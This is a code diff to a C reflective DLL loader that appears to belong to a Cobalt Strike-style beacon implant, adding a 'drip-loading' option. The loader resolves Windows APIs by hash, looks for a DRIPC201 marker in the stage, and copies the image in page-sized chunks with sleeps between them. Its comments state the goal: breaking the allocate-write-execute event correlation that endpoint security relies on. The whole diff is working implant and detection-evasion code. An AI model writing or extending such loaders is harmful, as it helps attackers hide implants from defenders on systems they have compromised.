@@ -119,6 +119,8 @@ typedef struct {
 #define BW_H_EXITTHREAD    0x60E0CEEFUL
 #define BW_H_FLUSHICACHE   0x53120980UL
 #define BW_H_GETCURPROC    0x7B8F17E6UL
+/* C-56: Sleep for stage drip-loading (rdll_use_driploading) */
+#define BW_H_SLEEP         0xDB2D49B0UL
 
 typedef HMODULE (WINAPI *BW_LOADLIBA)(LPCSTR);
 typedef FARPROC (WINAPI *BW_GETPROC)(HMODULE, LPCSTR);
@@ -127,6 +129,7 @@ typedef SIZE_T  (WINAPI *BW_VQUERY)(LPCVOID, PMEMORY_BASIC_INFORMATION, SIZE_T);
 typedef HMODULE (WINAPI *BW_LOADLIBEXW)(LPCWSTR, HANDLE, DWORD);
 typedef BOOL    (WINAPI *BW_FREELIB)(HMODULE);
 typedef VOID    (WINAPI *BW_EXITTHR)(DWORD);
+typedef VOID    (WINAPI *BW_SLEEP)(DWORD);
 typedef BOOL    (WINAPI *BW_FLUSH)(HANDLE, LPCVOID, SIZE_T);
 typedef HANDLE  (WINAPI *BW_GETCUR)(void);
 typedef BOOL    (WINAPI *BW_DLLMAIN)(void *, DWORD, void *);
@@ -310,6 +313,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     BW_EXITTHR     pET;
     BW_FLUSH       pFlush;
     BW_GETCUR      pGetCur;
+    BW_SLEEP       pSleep;
     unsigned char * nth;
     IMG_OPT64 * opt;
     IMG_SECTION * sec;
@@ -391,6 +395,7 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     pET             = (BW_EXITTHR)   bw_find_export_hash((void *)kern, BW_H_EXITTHREAD);
     pFlush          = (BW_FLUSH)     bw_find_export_hash((void *)kern, BW_H_FLUSHICACHE);
     pGetCur         = (BW_GETCUR)    bw_find_export_hash((void *)kern, BW_H_GETCURPROC);
+    pSleep          = (BW_SLEEP)     bw_find_export_hash((void *)kern, BW_H_SLEEP);
     if (pLoadLibraryA == NULL || pGetProcAddress == NULL || pVP == NULL ||
         pLLW == NULL)
         return 0;
@@ -488,13 +493,56 @@ __declspec(dllexport) ULONG_PTR WINAPI ReflectiveLoader(LPVOID lpParameter)
     }
 
     bw_zero(sc_base, size_of_image);
-    bw_copy(sc_base, flat, opt->SizeOfHeaders);
-    for (i = 0; i < nsec; i++) {
-        if (sec[i].SizeOfRawData == 0)
-            continue;
-        bw_copy(sc_base + sec[i].VirtualAddress,
-                flat + sec[i].PointerToRawData,
-                sec[i].SizeOfRawData);
+    /* C-56 stage drip-loading (4.12 rdll_use_driploading): the TS patches
+     * enable+delay into the DRIPC201 marker (src/stage_drip.c) in the stage
+     * bytes; honor it here by writing the image in page-sized drizzles with
+     * delay-ms sleeps - breaking the alloc->write->execute event
+     * correlation (technique: xuanxuan0/DripLoader, cited by the official
+     * 4.12 blog). Zeroed marker (or pre-C-56 beacon build) = plain copy. */
+    {
+        DWORD file_len = 0;
+        DWORD drip_on = 0, drip_ms = 0;
+        for (i = 0; i < nsec; i++) {
+            DWORD end = sec[i].PointerToRawData + sec[i].SizeOfRawData;
+            if (end > file_len)
+                file_len = end;
+        }
+        for (i = 0; i + 16 <= file_len; i += 4) {
+            if (flat[i] == 'D' && flat[i+1] == 'R' && flat[i+2] == 'I' && flat[i+3] == 'P'
+                && flat[i+4] == 'C' && flat[i+5] == '2' && flat[i+6] == '0' && flat[i+7] == '1') {
+                drip_on = *(DWORD *)(flat + i + 8);
+                drip_ms = *(DWORD *)(flat + i + 12);
+                break;
+            }
+        }
+        if (drip_on && pSleep != NULL) {
+            DWORD left, n;
+            bw_copy(sc_base, flat, opt->SizeOfHeaders);
+            for (i = 0; i < nsec; i++) {
+                if (sec[i].SizeOfRawData == 0)
+                    continue;
+                left = sec[i].SizeOfRawData;
+                j = 0;
+                while (left > 0) {
+                    n = left > 0x1000 ? 0x1000 : left;
+                    bw_copy(sc_base + sec[i].VirtualAddress + j,
+                            flat + sec[i].PointerToRawData + j, n);
+                    j += n;
+                    left -= n;
+                    if (left > 0 && drip_ms > 0)
+                        pSleep(drip_ms);
+                }
+            }
+        } else {
+            bw_copy(sc_base, flat, opt->SizeOfHeaders);
+            for (i = 0; i < nsec; i++) {
+                if (sec[i].SizeOfRawData == 0)
+                    continue;
+                bw_copy(sc_base + sec[i].VirtualAddress,
+                        flat + sec[i].PointerToRawData,
+                        sec[i].SizeOfRawData);
+            }
+        }
     }
 
     if (!bw_process_reloc(sc_base, size_of_image))
